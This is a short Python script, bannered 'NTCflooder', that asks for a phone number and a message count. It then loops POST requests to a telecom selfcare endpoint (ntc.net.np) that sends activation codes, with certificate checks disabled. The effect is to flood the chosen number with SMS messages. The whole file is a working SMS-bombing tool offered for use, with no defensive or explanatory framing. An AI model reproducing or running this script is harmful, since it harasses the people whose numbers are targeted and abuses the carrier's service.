from requests import post as p,packages as pac
print('''
     __  _____  ___  __ _                 _           
  /\ \ \/__   \/ __\/ _| | ___   ___   __| | ___ _ __ 
 /  \/ /  / /\/ /  | |_| |/ _ \ / _ \ / _` |/ _ \ '__|
/ /\  /  / / / /___|  _| | (_) | (_) | (_| |  __/ |   
\_\ \/   \/  \____/|_| |_|\___/ \___/ \__,_|\___|_|                                                         
''')
number = int(input('Enter NTC number [+]:'))
sendnumber = int(input('Enter no. of SMS you want to send [+]:'))
sendnumber += 1
print("Sending.....")
for n in range(0,sendnumber):
	pac.urllib3.disable_warnings()
	p('https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do',data={'userName':number,'codeType':'2'},verify = False)
print("The process has been completed.")
